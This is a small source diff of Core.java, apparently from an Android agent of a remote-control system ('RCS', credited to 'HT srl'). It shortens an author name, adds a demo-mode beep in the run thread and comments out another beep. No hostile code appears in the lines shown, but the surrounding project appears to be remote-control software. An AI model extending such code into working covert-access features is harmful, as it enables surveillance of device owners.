@@ -1,5 +1,5 @@
 /* *********************************************
- * Create by : Alberto "Quequero" Pelliccione
+ * Create by : Alberto "Q" Pelliccione
  * Company   : HT srl
  * Project   : AndroidService
  * Created   : 01-dec-2010
@@ -164,8 +164,11 @@ public class Core extends Activity implements Runnable {
 	public void run() {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " RCS Thread Started"); //$NON-NLS-1$
-
 			//startTrace();
+		}
+		
+		if (Cfg.DEMO) {
+			Beep.beepPenta();
 		}
 		
 		if(Cfg.TRACE){
@@ -464,7 +467,7 @@ public class Core extends Activity implements Runnable {
 		int ret = ConfType.Error;
 
 		if (Cfg.DEMO) {
-			Beep.beep();
+			//Beep.beep();
 		}
 
 		if (Cfg.DEBUG) {
